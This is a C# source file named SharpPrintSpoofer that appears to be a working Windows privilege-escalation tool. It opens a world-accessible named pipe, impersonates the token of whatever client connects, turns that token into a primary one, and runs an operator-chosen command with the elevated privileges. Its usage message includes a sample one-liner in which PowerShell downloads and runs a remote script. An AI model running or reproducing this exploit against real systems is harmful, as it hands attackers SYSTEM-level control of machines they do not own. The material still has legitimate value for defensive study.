﻿using System;
using System.Text;
using System.Security.Principal;
using System.Runtime.InteropServices;

namespace SharpPrintSpoofer
{
    class Program
    {
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }
        
        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }
        
        public struct TOKEN_USER
        {
            public SID_AND_ATTRIBUTES User;
        }
        
        [StructLayout(LayoutKind.Sequential)]
        public struct SID_AND_ATTRIBUTES
        {
            public IntPtr Sid;
            public int Attributes;
        }
        
        [DllImport("advapi32.dll")]
        static extern bool ConvertStringSecurityDescriptorToSecurityDescriptor(string StringSecurityDescriptor, uint StringSDRevision, out IntPtr SecurityDescriptor, IntPtr SecurityDescriptorSize);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateNamedPipe(string lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, ref SECURITY_ATTRIBUTES lpSecurityAttributes);
        
        [DllImport("kernel32.dll")]
        static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);
        
        [DllImport("advapi32.dll")]
        static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);
        
        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentThread();
        
        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);
        
        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetTokenInformation(IntPtr TokenHandle, uint tokenInformationClass, IntPtr tokenInformation, int tokenInformationLength, out int ReturnLength);
        
        [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool ConvertSidToStringSid(IntPtr Sid, out IntPtr StringSid);
        
        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);
        
        [DllImport("userenv.dll", SetLastError = true)]
        static extern bool CreateEnvironmentBlock(out IntPtr lpEnvironment, IntPtr hToken, bool bInherit);
        
        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool RevertToSelf();
        
        [DllImport("kernel32.dll")]
        static extern uint GetSystemDirectory([Out] StringBuilder lpBuffer, uint uSize);
        
        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool CreateProcessWithTokenW(IntPtr hToken, UInt32 dwLogonFlags, string lpApplicationName, string lpCommandLine, UInt32 dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        
        static void Main(string[] args)
        {
            if (args.Length < 2)
            {
                Console.WriteLine("Usage: SharpPrintSpoofer.exe <PIPENAME>\n\nExamples:\n\nSharpPrintSpoofer.exe \\\\.\\pipe\\test cmd -i\nSharpPrintSpoofer.exe \\\\.\\pipe\\test\\pipe\\spoolss \"powershell -exec bypass -c iex(new-object net.webclient).downloadstring('http://10.10.13.37/run.txt')\"");
                return;
            }
            
            string pipeName = args[0];
            string execCommand = args[1];
            bool execInteractively = args.Length == 3 && args[2] == "-i" ? true : false;
            
            // Prepare a new permission set for the pipe (Allowed GenercAll for Everyone)
            SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
            ConvertStringSecurityDescriptorToSecurityDescriptor(
                "D:(A;OICI;GA;;;WD)",
                1,
                out sa.lpSecurityDescriptor,
                IntPtr.Zero);
            
            // Create the named pipe
            IntPtr hPipe = CreateNamedPipe(
                pipeName,
                3, // PIPE_ACCESS_DUPLEX
                0, // PIPE_TYPE_BYTE | PIPE_WAIT
                10,
                0x1000,
                0x1000,
                0,
                ref sa);
            
            // Start the named pipe server to listen for connections
            Console.WriteLine($"[*] Named pipe {pipeName} listening...");
            ConnectNamedPipe(hPipe, IntPtr.Zero);
            
            // When a client connects, impersonate his token
            Console.WriteLine("[+] A client connected!");
            ImpersonateNamedPipeClient(hPipe);
            
            // Open a handle for the impersonated token
            IntPtr hToken;
            OpenThreadToken(
                GetCurrentThread(),
                0xF01FF, // TOKEN_ALL_ACCESS
                false,
                out hToken);
           
            // BEGIN DEBUG (print impersonated token SID)
            int tokenInfLength = 0;
            GetTokenInformation(
                hToken,
                1, // TokenUser
                IntPtr.Zero,
                tokenInfLength,
                out tokenInfLength);
            
            IntPtr tokenInformation = Marshal.AllocHGlobal(tokenInfLength);
            GetTokenInformation(
                hToken,
                1, // TokenUser
                tokenInformation,
                tokenInfLength,
                out tokenInfLength);
            
            TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(tokenInformation, typeof(TOKEN_USER));
            IntPtr pStringSid = IntPtr.Zero;
            ConvertSidToStringSid(TokenUser.User.Sid, out pStringSid);
            string stringSid = Marshal.PtrToStringAuto(pStringSid);
            Console.WriteLine($"[+] Token impersonated!\n  |  SID: {stringSid}");
            Marshal.FreeHGlobal(tokenInformation);
            // END DEBUG

            // Duplicate impersonated token (i.e., convert the impersonated token to a primary token for CreateProcessWithTokenW)
            IntPtr hSystemToken = IntPtr.Zero;
            DuplicateTokenEx(
                hToken,
                0xF01FF, // TOKEN_ALL_ACCESS
                IntPtr.Zero,
                2, // SecurityImpersonation
                1, // TokenPrimary
                out hSystemToken);
            
            String name = WindowsIdentity.GetCurrent().Name;
            Console.WriteLine($"  \\_ Name: {name}");
            
            // Revert to self to successfully CreateProcessWithTokenW
            RevertToSelf();
            
            // if not execInteractively
            uint dwLogonFlags = 0;
            uint dwCreationFlags = 0x8000000; // CREATE_NO_WINDOW
            IntPtr lpEnvironment = IntPtr.Zero;
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            
            if (execInteractively)
            {
                dwLogonFlags = 1; // LOGON_WITH_PROFILE
                dwCreationFlags = 0x400; // CREATE_UNICODE_ENVIRONMENT
                CreateEnvironmentBlock(out lpEnvironment, hToken, false);
                si.lpDesktop = @"WinSta0\Default";
            }
            
            // Get the system directory: COMMENTED BY DEFAULT, UNCOMMENTED
            StringBuilder sbSystemDir = new StringBuilder(256);
            GetSystemDirectory(sbSystemDir, 256);
            
            // Create a new process based on execCommand (binary and args) with the impersonated token
            Console.WriteLine($"[*] Executing command: {execCommand}");
            CreateProcessWithTokenW(
                hSystemToken,
                dwLogonFlags,
                null,
                execCommand,
                dwCreationFlags,
                lpEnvironment,
                sbSystemDir.ToString(),
                ref si,
                out pi);
        }
    }
}